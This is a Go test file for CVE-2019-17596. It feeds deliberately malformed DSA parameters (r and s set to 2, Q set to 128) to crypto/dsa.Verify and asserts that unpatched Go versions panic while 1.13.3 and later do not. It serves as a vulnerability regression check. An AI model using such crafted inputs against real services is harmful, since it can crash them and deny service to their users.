package poc_dsa_parser_CVE_2019_17596

import (
	"github.com/stretchr/testify/require"

	"crypto/dsa"
	"crypto/rand"
	"testing"
)

func TestDSAVerify(t *testing.T) {
	priv := examplePriaveKey()

	hashed := []byte("testing")
	r, s, err := dsa.Sign(rand.Reader, priv, hashed)
	require.NoError(t, err)

	require.True(t, dsa.Verify(&priv.PublicKey, hashed, r, s))

	r.SetInt64(2)
	s.SetInt64(2)
	priv.PublicKey.Q.SetInt64(128)

	tf := func() {
		require.True(t, dsa.Verify(&priv.PublicKey, hashed, r, s))
	}
	major, minor, patch := goVersion(t)
	if major >= 1 && minor >= 13 && patch >= 3 || (major >= 1 && minor > 13) {
		require.NotPanics(t, tf)
	} else {
		require.Panics(t, tf)
	}
}
